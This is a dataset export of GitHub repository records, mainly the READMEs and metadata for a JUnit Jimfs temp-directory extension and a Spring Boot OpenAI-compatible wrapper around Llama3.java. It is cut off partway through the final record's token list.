We welcome contributions to Sigma! If you have any ideas, suggestions, or bug reports, please feel free to open an issue or submit a pull request.",1,0,1,apache-2.0,0.0,"['sigma', 'introduction', 'sigma', 'high', 'performance', 'api', 'gateway', 'based', 'vertx', 'netty', 'execute', 'native', 'image', 'based', 'vertx', 'vertx', 'reactive', 'web', 'framework', 'jvm', 'provides', 'many', 'feature', 'thanks', 'vertx', 'ecosystem', 'sigma', 'achieve', 'extremely', 'high', 'performance', 'minimal', 'cost', 'vertx', 'module', 'sigma', 'used', 'vertx', 'core', 'vertx', 'web', 'vertx', 'http', 'proxy', 'vertx', 'vertx', 'new', 'interface', 'added', 'linux', 'kernel', 'high', 'performance', 'scalable', 'interface', 'fully', 'asynchronous', 'linux', 'syscalls', 'based', 'netty', 'detail', 'github', 'project', 'u', 'see', 'detail', 'github', 'project', 'thd', 'help', 'vertx', 'sigma', 'high', 'io', 'performance', 'native', 'transport', 'run', 'native', 'transport', 'available', 'bsd', 'osx', 'linux', 'jni', 'transport', 'add', 'feature', 'specific', 'particular', 'platform', 'generate', 'less', 'garbage', 'generally', 'improve', 'performance', 'compared', 'nio', 'based', 'transport', 'sigma', 'improved', 'data', 'transfer', 'speed', 'help', 'native', 'transport', 'although', 'work', 'linux', 'bsd', 'system', 'fortunately', 'service', 'run', 'system', 'graalvm', 'native', 'image', 'native', 'image', 'technology', 'compile', 'java', 'code', 'native', 'executable', 'native', 'executable', 'includes', 'code', 'required', 'run', 'time', 'application', 'class', 'class', 'language', 'runtime', 'native', 'code', 'jdk', 'running', 'application', 'native', 'executable', 'file', 'compared', 'traditional', 'java', 'running', 'method', 'advantage', 'faster', 'startup', 'speed', 'smaller', 'packaging', 'size', 'smaller', 'runtime', 'memory', 'usage', 'sigma', 'executed', 'native', 'executable', 'file', 'adapt', 'cloud', 'native', 'era', 'better', 'warning', 'checking', 'github', 'action', 'runner', 'image', 'software', 'graalvm', 'native', 'image', 'prerequisite', 'requirement', 'github', 'action', 'found', 'window', 'sdk', 'missing', 'window', 'latest', 'image', 'github', 'action', 'runner', 'need', 'use', 'sigma', 'binary', 'file', 'window', 'platform', 'please', 'compile', 'according', 'documentation', 'deploy', 'sigma', 'using', 'jar', 'java', 'virtual', 'thread', 'virtual', 'thread', 'faster', 'thread', 'run', 'code', 'faster', 'platform', 'thread', 'exist', 'provide', 'scale', 'higher', 'throughput', 'speed', 'lower', 'latency', 'many', 'platform', 'thread', 'enable', 'higher', 'concurrency', 'needed', 'higher', 'throughput', 'according', 'little', 'law', 'io', 'intensive', 'task', 'load', 'usually', 'limited', 'cpu', 'case', 'even', 'number', 'thread', 'exceeds', 'number', 'core', 'throughput', 'improved', 'virtual', 'thread', 'help', 'improve', 'throughput', 'typical', 'server', 'application', 'precisely', 'application', 'consist', 'great', 'number', 'concurrent', 'task', 'spend', 'much', 'time', 'waiting', 'unlike', 'o', 'threading', 'model', 'typically', 'manages', 'thread', 'thread', 'pool', 'reduce', 'overhead', 'creating', 'thread', 'reusing', 'thread', 'virtual', 'thread', 'provide', 'higher', 'throughput', 'offering', 'lower', 'latency', 'sigma', 'high', 'concurrency', 'performance', 'help', 'vertx', 'support', 'virtual', 'thread', 'feature', 'list', 'route', 'upstream', 'load', 'balance', 'plugin', 'example', 'usage', 'binary', 'begin', 'download', 'latest', 'program', 'operating', 'system', 'architecture', 'release', 'page', 'next', 'place', 'sigma', 'binary', 'configuration', 'file', 'server', 'finally', 'edit', 'configuration', 'access', 'computer', 'lan', 'network', 'via', 'ssh', 'step', 'modify', 'file', 'see', 'part', 'edit', 'part', 'proxy', 'server', 'protocol', 'config', 'u', 'use', 'default', 'mean', 'sigma', 'http', 'proxy', 'server', 'bind', 'port', 'part', 'http', 'proxy', 'server', 'config', 'need', 'modify', 'except', 'want', 'adjust', 'improve', 'performance', 'part', 'router', 'main', 'config', 'decide', 'request', 'proxy', 'handler', 'config', 'router', 'belonged', 'proxy', 'server', 'define', 'array', 'http', 'request', 'path', 'handle', 'configuration', 'determines', 'proxy', 'pas', 'rule', 'submit', 'request', 'part', 'main', 'config', 'configuration', 'determines', 'handle', 'request', 'received', 'proxy', 'server', 'proxy', 'requst', 'send', 'upsteam', 'part', 'main', 'config', 'configuration', 'define', 'server', 'discoverty', 'method', 'load', 'balance', 'rule', 'upstream', 'node', 'simple', 'example', 'mean', 'send', 'proxy', 'request', 'upsteam', 'list', 'static', 'config', 'start', 'sigma', 'jar', 'step', 'similar', 'binary', 'step', 'roadmap', 'milestone', 'version', 'done', 'benchmark', 'benchmark', 'environment', 'apple', 'pro', 'vcpus', 'gb', 'memory', 'benchmark', 'test', 'reverse', 'proxy', 'use', 'sigma', 'reverse', 'proxy', 'server', 'include', 'path', 'rewrite', 'plugin', 'logging', 'plugins', 'enabled', 'qps', 'pro', 'cpu', 'arch', 'dont', 'tech', 'test', 'use', 'core', 'wrk', 'core', 'nginx', 'sigma', 'reverse', 'proxy', 'core', 'upstream', 'upstream', 'return', 'simple', 'json', 'response', 'upstream', 'port', 'nginx', 'port', 'sigma', 'port', 'path', 'rewrite', 'sigma', 'little', 'bit', 'faster', 'nginx', 'situation', 'still', 'fast', 'lot', 'room', 'improve', 'contributing', 'welcome', 'contribution', 'sigma', 'idea', 'suggestion', 'bug', 'report', 'please', 'feel', 'free', 'open', 'issue', 'submit', 'pull', 'request']","['sigma', 'native', 'proxy', 'thread', 'vertx']",2,0,0,"['sigma', 'introduction', 'base', 'vertx', 'http', 'vertx', 'https', 'native', 'transport', 'https', 'graalvm', 'native', 'image', 'https', 'java', 'virtual', 'thread', 'http', 'feature', 'list', 'example', 'usage', 'binary', 'access', 'computer', 'lan', 'network', 'via', 'ssh', 'step', 'modify', 'file', 'start', 'sigma', 'jar', 'roadmap', 'milestone', 'benchmark', 'benchmark', 'environment', 'benchmark', 'test', 'reverse', 'proxy', 'qps', 'upstream', 'on', 'port', 'nginx', 'on', 'port', 'sigma', 'on', 'port', 'path', 'rewrite', 'contribute']",25,"['sigma', 'https', 'benchmark', 'on', 'port']",11,0.0,1.0,"[maven-compiler-plugin,maven-failsafe-plugin,maven-shade-plugin,maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.graalvm.buildtools:native-maven-plugin]",0.0,1.0,0.0,9202,28.1,4.634163701067616,"['Based on vertx -> https://vertx.io/', 'Vertx io_uring -> https://vertx.io/docs/vertx-io_uring-incubator/java/', 'GitHub Project -> https://github.com/netty/netty-incubator-transport-io_uring', 'Native transports -> https://netty.io/wiki/native-transports.html', 'GraalVM native image -> https://www.graalvm.org/latest/reference-manual/native-image/', 'GitHub actions runner image -> https://github.com/actions/runner-images?tab=readme-ov-file', 'GraalVM Native image prerequisites -> https://www.graalvm.org/latest/reference-manual/native-image/#prerequisites', 'JAVA virtual thread -> https://openjdk.org/jeps/444']",8
scordio/jimfs-junit-jupiter,main,"# Jimfs JUnit Jupiter [![Maven Central](https://img.shields.io/maven-central/v/io.github.scordio/jimfs-junit-jupiter?label=Maven%20Central)](https://mvnrepository.com/artifact/io.github.scordio/jimfs-junit-jupiter) [![javadoc](https://javadoc.io/badge2/io.github.scordio/jimfs-junit-jupiter/javadoc.svg)](https://javadoc.io/doc/io.github.scordio/jimfs-junit-jupiter)

[![CI](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml?query=branch%3Amain)
[![Cross-Version](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml?query=branch%3Amain)

This project provides a [JUnit Jupiter][] extension for in-memory
[`@TempDir`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html)
directories via the [Jimfs][] file system.

## Motivation

Today, it is already possible to use Jimfs and JUnit Jupiter together to create in-memory temporary directories for
testing.
However, it requires Jimfs in-memory file system handling hooked into JUnit Jupiter test lifecycle callbacks,
a boilerplate that users must implement on their own.

Starting from [version 5.10](https://junit.org/junit5/docs/5.10.0/release-notes/index.html#release-notes),
JUnit Jupiter offers a
[`TempDirFactory` SPI](https://junit.org/junit5/docs/5.10.0/user-guide/#writing-tests-built-in-extensions-TempDirectory)
for customizing how temporary directories are created via the `@TempDir` annotation.
The SPI allows libraries like Jimfs to provide their implementation.

First-party support was requested in [google/jimfs#258](https://github.com/google/jimfs/issues/258).
However, Google has not yet started using JUnit Jupiter, and such first-party support may only be provided when
Google does so.

Because of that, this extension was created to aid all the users who would like a smooth integration between Jimfs
and JUnit Jupiter.
This project will likely be discontinued if Google ever offers first-party support for this integration.

## Compatibility

Jimfs JUnit Jupiter is based on JUnit Jupiter 5, thus requiring at least Java 8.

Compatibility is guaranteed only with the JUnit Jupiter versions from 5.10 to the latest.

## Getting Started

### Maven

```xml
<dependency>
  <groupId>io.github.scordio</groupId>
  <artifactId>jimfs-junit-jupiter</artifactId>
  <version>${jimfs-junit-jupiter.version}</version>
  <scope>test</scope>
</dependency>
```

### Gradle

```kotlin
testImplementation(""io.github.scordio:jimfs-junit-jupiter:${jimfsJunitJupiterVersion}"")
```

### JimfsTempDirFactory

The simplest usage is to set the
[`factory`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html#factory())
attribute of `@TempDir` to `JimfsTempDirFactory`:

```java
@Test
void test(@TempDir(factory = JimfsTempDirFactory.class) Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

### @JimfsTempDir

`@JimfsTempDir`, a `@TempDir`
[composed annotation](https://junit.org/junit5/docs/current/user-guide/#writing-tests-meta-annotations),
can be used as a drop-in replacement for `@TempDir(factory = JimfsTempDirFactory.class)`:

```java
@Test
void test(@JimfsTempDir Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

The default behavior of the annotation is equivalent to using `JimfsTempDirFactory` directly:
`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

For better control over the underlying in-memory file system, `@JimfsTempDir` offers an optional `value` attribute
that can be set to the desired configuration, one of:
* `DEFAULT`: based on the corresponding [configuration parameter](#default-jimfs-configuration) (default)
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```java
@Test
void test(@JimfsTempDir(WINDOWS) Path tempDir) {
  assertThat(tempDir.getFileSystem().getSeparator()).isEqualTo(""\\"");
}
```

### Configuration Parameters

Jimfs JUnit Jupiter supports JUnit
[configuration parameters](https://junit.org/junit5/docs/current/user-guide/#running-tests-config-params).

#### Default `@TempDir` Factory

The `junit.jupiter.tempdir.factory.default` configuration parameter sets the default factory to use, expecting its
fully qualified class name.

For example, the following configures `JimfsTempDirFactory`:

```properties
junit.jupiter.tempdir.factory.default=io.github.scordio.jimfs.junit.jupiter.JimfsTempDirFactory
```

The factory will be used for all `@TempDir` annotations unless the `factory` attribute of the annotation
specifies a different type.

#### Default Jimfs Configuration

The `jimfs.junit.jupiter.tempdir.configuration.default` configuration parameter sets the default Jimfs configuration
to use, expecting one of the following (case-insensitive):
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform (default)
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```properties
jimfs.junit.jupiter.tempdir.configuration.default=windows
```

All Jimfs-based temporary directories will be configured accordingly unless `@JimfsTempDir` is used and
its `value` attribute is set.

### Limitations

Jimfs JUnit Jupiter only supports annotated fields or parameters of type `Path`, as Jimfs is a non-default file
system and `File` instances can only be associated with the default file system.

## Improvements

Compared to the configuration options that Jimfs provides, Jimfs JUnit Jupiter exposes a much smaller surface to keep
its usage simple.

In case something is missing for your use case, please [raise an issue](../../issues/new)!

## License

Jimfs JUnit Jupiter is released under version 2.0 of the [Apache License][].

[Apache License]: https://www.apache.org/licenses/LICENSE-2.0
[Jimfs]: https://github.com/google/jimfs
[JUnit Jupiter]: https://github.com/junit-team/junit5
",2,0,4,apache-2.0,0.0,"['jimfs', 'junit', 'jupiter', 'project', 'provides', 'junit', 'jupiter', 'extension', 'directory', 'via', 'jimfs', 'file', 'system', 'motivation', 'today', 'already', 'possible', 'use', 'jimfs', 'junit', 'jupiter', 'together', 'create', 'temporary', 'directory', 'testing', 'however', 'requires', 'jimfs', 'file', 'system', 'handling', 'hooked', 'junit', 'jupiter', 'test', 'lifecycle', 'callback', 'boilerplate', 'user', 'must', 'implement', 'starting', 'version', 'junit', 'jupiter', 'offer', 'spi', 'customizing', 'temporary', 'directory', 'created', 'via', 'annotation', 'spi', 'allows', 'library', 'like', 'jimfs', 'provide', 'implementation', 'support', 'requested', 'however', 'google', 'yet', 'started', 'using', 'junit', 'jupiter', 'support', 'may', 'provided', 'google', 'extension', 'created', 'aid', 'user', 'would', 'like', 'smooth', 'integration', 'jimfs', 'junit', 'jupiter', 'project', 'likely', 'discontinued', 'google', 'ever', 'offer', 'support', 'integration', 'compatibility', 'jimfs', 'junit', 'jupiter', 'based', 'junit', 'jupiter', 'thus', 'requiring', 'least', 'java', 'compatibility', 'guaranteed', 'junit', 'jupiter', 'version', 'latest', 'getting', 'started', 'maven', 'gradle', 'jimfstempdirfactory', 'simplest', 'usage', 'set', 'attribute', 'resolved', 'temporary', 'directory', 'based', 'jimfs', 'appropriately', 'configured', 'current', 'platform', 'jimfstempdir', 'composed', 'annotation', 'used', 'replacement', 'default', 'behavior', 'annotation', 'equivalent', 'using', 'directly', 'resolved', 'temporary', 'directory', 'based', 'jimfs', 'appropriately', 'configured', 'current', 'platform', 'better', 'control', 'underlying', 'file', 'system', 'offer', 'optional', 'attribute', 'set', 'desired', 'configuration', 'one', 'based', 'corresponding', 'configuration', 'parameter', 'default', 'appropriate', 'current', 'platform', 'mac', 'o', 'file', 'system', 'file', 'system', 'file', 'system', 'example', 'following', 'defines', 'temporary', 'directory', 'regardless', 'platform', 'test', 'running', 'configuration', 'parameter', 'jimfs', 'junit', 'jupiter', 'support', 'junit', 'configuration', 'parameter', 'default', 'factory', 'configuration', 'parameter', 'set', 'default', 'factory', 'use', 'expecting', 'fully', 'qualified', 'class', 'name', 'example', 'following', 'configures', 'factory', 'used', 'annotation', 'unless', 'attribute', 'annotation', 'specifies', 'different', 'type', 'default', 'jimfs', 'configuration', 'configuration', 'parameter', 'set', 'default', 'jimfs', 'configuration', 'use', 'expecting', 'one', 'following', 'appropriate', 'current', 'platform', 'default', 'mac', 'o', 'file', 'system', 'file', 'system', 'file', 'system', 'example', 'following', 'defines', 'temporary', 'directory', 'regardless', 'platform', 'test', 'running', 'temporary', 'directory', 'configured', 'accordingly', 'unless', 'used', 'attribute', 'set', 'limitation', 'jimfs', 'junit', 'jupiter', 'support', 'annotated', 'field', 'parameter', 'type', 'jimfs', 'file', 'system', 'instance', 'associated', 'default', 'file', 'system', 'improvement', 'compared', 'configuration', 'option', 'jimfs', 'provides', 'jimfs', 'junit', 'jupiter', 'expose', 'much', 'smaller', 'surface', 'keep', 'usage', 'simple', 'case', 'something', 'missing', 'use', 'case', 'please', 'raise', 'issue', 'license', 'jimfs', 'junit', 'jupiter', 'released', 'version', 'apache', 'license']","['jimfs', 'junit', 'jupiter', 'file', 'system']",3,0,0,"['jimfs', 'junit', 'jupiter', 'maven', 'central', 'http', 'https', 'javadoc', 'http', 'https', 'motivation', 'compatibility', 'get', 'start', 'maven', 'gradle', 'jimfstempdirfactory', 'jimfstempdir', 'configuration', 'parameter', 'default', 'tempdir', 'factory', 'default', 'jimfs', 'configuration', 'limitation', 'improvement', 'license']",14,"['jimfs', 'maven', 'http', 'https', 'configuration']",7,0.0,1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.mycila:license-maven-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0,6716,36.03846153846154,5.59871931696905,"['![Maven Central -> https://img.shields.io/maven-central/v/io.github.scordio/jimfs-junit-jupiter?label=Maven%20Central', '![javadoc -> https://javadoc.io/badge2/io.github.scordio/jimfs-junit-jupiter/javadoc.svg', '![CI -> https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml/badge.svg?branch=main', '![Cross-Version -> https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml/badge.svg?branch=main', '`@TempDir` -> https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html', 'version 5.10 -> https://junit.org/junit5/docs/5.10.0/release-notes/index.html#release-notes', '`TempDirFactory` SPI -> https://junit.org/junit5/docs/5.10.0/user-guide/#writing-tests-built-in-extensions-TempDirectory', 'google/jimfs#258 -> https://github.com/google/jimfs/issues/258', '`factory` -> https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html#factory(', 'composed annotation -> https://junit.org/junit5/docs/current/user-guide/#writing-tests-meta-annotations', 'configuration parameters -> https://junit.org/junit5/docs/current/user-guide/#running-tests-config-params', 'JUnit Jupiter', 'Jimfs', 'Apache License', 'Apache License', 'Jimfs', 'JUnit Jupiter']",17
stephanj/Llama3JavaChatCompletionService,master,"# Llama3.java Inference with OpenAI Chat Completion REST API ☕️

This project provides a REST API wrapper for the amazing [Llama3.java project](https://github.com/mukel/llama3.java) from Alfonso² Peterssen. 
The wrapper is compliant with the OpenAI API specification for chat completions.

## ToDo 

- [X] SpringBoot wrapper around Llama3.java
- [X] Create Java Flame graph to see where performance issue's are located (matmul 🔥)
- [ ] Optional: Quarkus wrapper around Llama3.java
- [ ] TornadoVM enabled version
- [ ] GraalVM native version
- [ ] LLM Sharding (Layers, Attn Head)
- [ ] BitNets support 
- [ ] Ternary Models support

## On Apple Silicon (M1/M2/M3)

Make sure to download an ARM compliant SDK, for example from https://bell-sw.com/pages/downloads/#jdk-21-lts 

https://github.com/user-attachments/assets/6fecb9c1-6c84-4a01-a63b-272e75009618

## Setup

Set the JAVA_HOME environment variable to the ARM SDK path. 

Example with Zulu JDK 23 (zulu23.30.13-ca-jdk23.0.1-macosx_aarch64)

```bash
export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-23.jdk/Contents/Home
```

IMPORTANT: Do not use SDKMan because this will fall back to the x86 version of the SDK.

## Build 

```bash
mvn clean package
```

## Download LLM

Download a GGUF model from the Hugging Face model hub and place it in the 'models' directory. 
For example:

```bash
mkdir models 
cd models
curl https://huggingface.co/hugging-quants/Llama-3.2-1B-Instruct-Q8_0-GGUF/blob/main/llama-3.2-1b-instruct-q8_0.gguf
```

Update the 'llama.model.name' variable in the application.properties file if you use a different model.

```application.properties
spring.application.name=Llama3.java Server
server.servlet.context-path=/

llama.model.path=models
llama.model.name=Meta-Llama-3.2-1b-instruct-Q8_0.gguf

logging.level.com.llama4j=INFO

server.address=localhost
server.port=8080
```

## Run 

Start the Spring Boot app which holds the Llama3.java REST wrapper as follows:

```bash
java --add-modules jdk.incubator.vector --enable-preview -jar target/llama3-server-1.0.0-SNAPSHOT.jar
```

or use the run.sh script which sets some extra JVM GC and Heap settings

```bash
./run.sh
```

## Test using Curl

```bash
curl -X POST http://localhost:8080/chat/completions \
-H ""Content-Type: application/json"" \
-d '{
  ""messages"": [
    {
      ""role"": ""system"",
      ""content"": ""You are a comedian.""
    },
    {
      ""role"": ""user"",
      ""content"": ""Tell me a joke.""
    }
  ],
  ""temperature"": 0.7,
  ""top_p"": 0.95,
  ""max_tokens"": 100
}'
```

Response

```json
{
   ""id"":""chatcmpl-1"",
   ""object"":""chat.completion"",
   ""created"":1729447400,
   ""model"":""Meta-Llama-3.2-1b-instruct-Q8_0.gguf"",
   ""systemFingerprint"":""fp_178ce5010c913"",
   ""choices"":[
      {
         ""index"":0,
         ""message"":{
            ""role"":""assistant"",
            ""content"":""A man walked into a library and asked the librarian, \""Do you have any books on Pavlov's dogs and Schrödinger's cat?\"" The librarian replied, \""It rings a bell, but I'm not sure if it's here or not.\""""
         },
         ""logprobs"":null,
         ""finishReason"":""stop""
      }
   ],
   ""usage"":{
      ""promptTokens"":25,
      ""completionTokens"":53,
      ""totalTokens"":78,
      ""completionTokensDetails"":{
         ""reasoningTokens"":0
      }
   }
```

## Test using DevoxxGenie 

Launch any JetBrains IDE (such as IDEA, CLion, WebStorm, etc.) and install '[DevoxxGenie](https://plugins.jetbrains.com/plugin/24169-devoxxgenie)' from the Plugins marketplace. 
You can then choose either 'Jlama (Experimental)' or 'Exo (Experimental)', both of which utilize OpenAI's Chat Completion.

Next, enter a prompt and optionally attach files to the window context by using the 'Add File' icon located below the prompt text area.

Example with file attachment in prompt context:

![Demo2](https://github.com/user-attachments/assets/cbd8af2e-d3bd-4d9a-bdf5-0c2bc033915f)

## Baseline Performance Stats

Running on Apple M1 Max with 64Gb (LPDDR5) of RAM (32 number of Cores).  

![CallTree](https://github.com/user-attachments/assets/75e739e2-44b9-4e2b-a077-63021cb9ea39)

### Key Findings by ChatGPT

This profiling trace shows a CPU-heavy Java application, likely dealing with machine learning or vectorized computation. Here's a breakdown of key components:

1. **Heavy CPU Usage (`java.util.concurrent.ForkJoinWorkerThread.run`) at 86%**
   - This is likely a thread-pool executor used for parallelizing tasks. It suggests significant multi-threaded execution, possibly parallelized matrix operations or tensor calculations.

2. **`com.llama4j.core.FloatTensor$$Lambda.accept` (61.5%)**
   - This method involves processing a tensor's float data. Lambda expressions in Java are anonymous functions, often used for concise representations of callbacks or functional programming.

3. **`jdk.incubator.vector.FloatVector.reduceLanes` (49.5%)**
   - Indicates vectorized computation involving float vectors. This uses the Vector API from the JDK's incubator module, designed to perform operations on wide vectors leveraging CPU SIMD (Single Instruction, Multiple Data) capabilities.

4. **`com.llama4j.core.ArrayFloatTensor.getFloatVector` (7.7%)**
   - Suggests fetching float vectors from an array-based tensor representation. This could be another bottleneck related to memory access when performing operations.

5. **`com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions` (13.9%)**
   - Indicates that part of the time is spent processing chat completion requests, suggesting this application is likely an LLM interface or chatbot.

6. **`com.llama4j.core.FloatTensor.matmul` (12.0%)**
   - This is the matrix multiplication function, which contributes to the linear algebra operations in the application, likely forming the backbone of the model's computations.

### Potential Bottlenecks and Optimization Ideas

- **ForkJoinWorkerThread**: If this thread is consuming 86% of the CPU, there might be room to optimize the parallelization strategy. Investigate if there’s overhead or contention between threads.
- **Vectorization**: The use of `jdk.incubator.vector.FloatVector` shows a good attempt at leveraging vectorized operations, but it may need tuning based on the target CPU’s vector width (e.g., AVX-512 support).
- **Memory Access**: The significant time spent in `ArrayFloatTensor.getFloatVector` could indicate a memory bandwidth bottleneck. This might benefit from optimizing data locality or using more efficient memory layouts (like row-major or column-major order).

---

### Key Findings by Claude

1. **FloatTensor Operations: 61.5% of execution time**

com.llama4j.core.FloatTensor$$Lambda$0x0000000080143b048.accept(int)
Likely the core model inference bottleneck

2. **Vector Operations: 49.5% of execution time**

jdk.incubator.vector.Float128Vector.reduceLanes(VectorOperators$Associative)
Part of the FloatTensor operations

3. **Array Processing: 7.7% of execution time**

com.llama4j.core.ArrayFloatTensor.getFloatVector(VectorSpecies, int)

4. **HTTP Request Handling: 13.9% of execution time**

com.llama4j.web.rest.LlamaWrapperApplication.chatCompletions(ChatCompletionRequest)

#### Recommendations

1. **Optimize Tensor Operations:**

Profile the FloatTensor class to identify specific bottlenecks
Consider using more efficient linear algebra libraries or GPU acceleration
Optimize memory access patterns and data structures

2. **Improve Vector Processing:**

Investigate the use of more efficient vector operations or libraries
Consider using SIMD instructions if not already implemented

3. **Enhance Array Processing:**

Optimize the getFloatVector method in ArrayFloatTensor
Consider using more efficient data structures or access patterns

4. **Optimize HTTP Request Handling:**

Profile the chatCompletions method to identify specific bottlenecks
Consider implementing caching mechanisms or request batching
Optimize data serialization/deserialization if applicable

#### General Optimizations:

- Implement multi-threading for parallel processing where applicable
- Optimize memory usage and garbage collection
- Consider using a more performant JVM or JIT compiler

---

## Credits

This is just a simple Spring Boot OpenAI REST wrapper around the amazing [Llama3.java project](https://github.com/mukel/llama3.java) from Alfonso² Peterssen! 

Thanks Alfonso for leading the way! 💪🏻 ☕️
",0,0,1,mit,0.0,"['inference', 'openai', 'chat', 'completion', 'rest', 'api', 'project', 'provides', 'rest', 'api', 'wrapper', 'amazing', 'project', 'peterssen', 'wrapper', 'compliant', 'openai', 'api', 'specification', 'chat', 'completion', 'todo', 'x', 'springboot', 'wrapper', 'around', 'x', 'create', 'java', 'flame', 'graph', 'see', 'performance', 'issue', 'located', 'matmul', 'optional', 'quarkus', 'wrapper', 'around', 'tornadovm', 'enabled', 'version', 'graalvm', 'native', 'version', 'llm', 'sharding', 'layer', 'attn', 'head', 'bitnets', 'support', 'ternary', 'model', 'support', 'apple', 'silicon', 'make', 'sure', 'download', 'arm', 'compliant', 'sdk', 'example', 'http', 'http', 'setup', 'set', 'environment', 'variable', 'arm', 'sdk', 'path', 'example', 'zulu', 'jdk', 'important', 'use', 'sdkman', 'fall', 'back', 'version', 'sdk', 'build', 'download', 'llm', 'download', 'gguf', 'model', 'hugging', 'face', 'model', 'hub', 'place', 'directory', 'example', 'update', 'variable', 'file', 'use', 'different', 'model', 'run', 'start', 'spring', 'boot', 'app', 'hold', 'rest', 'wrapper', 'follows', 'use', 'script', 'set', 'extra', 'jvm', 'gc', 'heap', 'setting', 'test', 'using', 'curl', 'response', 'test', 'using', 'devoxxgenie', 'launch', 'jetbrains', 'ide', 'idea', 'clion', 'webstorm', 'etc', 'install', 'devoxxgenie', 'plugins', 'marketplace', 'choose', 'either', 'experimental', 'experimental', 'utilize', 'openai', 'chat', 'completion', 'next', 'enter', 'prompt', 'optionally', 'attach', 'file', 'window', 'context', 'using', 'file', 'icon', 'located', 'prompt', 'text', 'area', 'example', 'file', 'attachment', 'prompt', 'context', 'baseline', 'performance', 'stats', 'running', 'apple', 'max', 'ram', 'number', 'core', 'key', 'finding', 'chatgpt', 'profiling', 'trace', 'show', 'java', 'application', 'likely', 'dealing', 'machine', 'learning', 'vectorized', 'computation', 'breakdown', 'key', 'component', 'heavy', 'cpu', 'usage', 'likely', 'executor', 'used', 'parallelizing', 'task', 'suggests', 'significant', 'execution', 'possibly', 'parallelized', 'matrix', 'operation', 'tensor', 'calculation', 'method', 'involves', 'processing', 'tensor', 'float', 'data', 'lambda', 'expression', 'java', 'anonymous', 'function', 'often', 'used', 'concise', 'representation', 'callback', 'functional', 'programming', 'indicates', 'vectorized', 'computation', 'involving', 'float', 'vector', 'us', 'vector', 'api', 'jdk', 'incubator', 'module', 'designed', 'perform', 'operation', 'wide', 'vector', 'leveraging', 'cpu', 'simd', 'single', 'instruction', 'multiple', 'data', 'capability', 'suggests', 'fetching', 'float', 'vector', 'tensor', 'representation', 'could', 'another', 'bottleneck', 'related', 'memory', 'access', 'performing', 'operation', 'indicates', 'part', 'time', 'spent', 'processing', 'chat', 'completion', 'request', 'suggesting', 'application', 'likely', 'llm', 'interface', 'chatbot', 'matrix', 'multiplication', 'function', 'contributes', 'linear', 'algebra', 'operation', 'application', 'likely', 'forming', 'backbone', 'model', 'computation', 'potential', 'bottleneck', 'optimization', 'idea', 'forkjoinworkerthread', 'thread', 'consuming', 'cpu', 'might', 'room', 'optimize', 'parallelization', 'strategy', 'investigate', 'overhead', 'contention', 'thread', 'vectorization', 'use', 'show', 'good', 'attempt', 'leveraging', 'vectorized', 'operation', 'may', 'need', 'tuning', 'based', 'target', 'cpu', 'vector', 'width', 'support', 'memory', 'access', 'significant', 'time', 'spent', 'could', 'indicate', 'memory', 'bandwidth', 'bottleneck', 'might', 'benefit', 'optimizing', 'data', 'locality', 'using', 'efficient', 'memory', 'layout', 'like', 'order', 'key', 'finding', 'claude', 'floattensor', 'operation', 'execution', 'time', 'lambda', 'int', 'likely', 'core', 'model', 'inference', 'bottleneck', 'vector', 'operation', 'execution', 'time', 'vectoroperators', 'associative', 'part', 'floattensor', 'operation', 'array', 'processing', 'execution', 'time', 'vectorspecies', 'int', 'http', 'request', 'handling', 'execution', 'time', 'chatcompletionrequest', 'recommendations', 'optimize', 'tensor', 'operation', 'profile', 'floattensor', 'class', 'identify', 'specific', 'bottleneck', 'consider', 'using', 'efficient', 'linear', 'algebra', 'library', 'gpu', 'acceleration', 'optimize', 'memory', 'access', 'pattern', 'data', 'structure', 'improve', 'vector', 'processing', 'investigate', 'use', 'efficient', 'vector', 'operation', 'library', 'consider', 'using', 'simd', 'instruction', 'already', 'implemented', 'enhance', 'array', 'processing', 'optimize', 'getfloatvector', 'method', 'arrayfloattensor', 'consider', 'using', 'efficient', 'data', 'structure', 'access', 'pattern', 'optimize', 'http', 'request', 'handling', 'profile', 'chatcompletions', 'method', 'identify', 'specific', 'bottleneck', 'consider', 'implementing', 'caching', 'mechanism', 'request', 'batching', 'optimize', 'data', 'applicable', 'general', 'optimization', 'implement', 'parallel', 'processing', 'applicable', 'optimize', 'memory', 'usage', 'garbage', 'collection', 'consider', 'using', 'performant', 'jvm', 'jit', 'compiler', 'credit', 'simple', 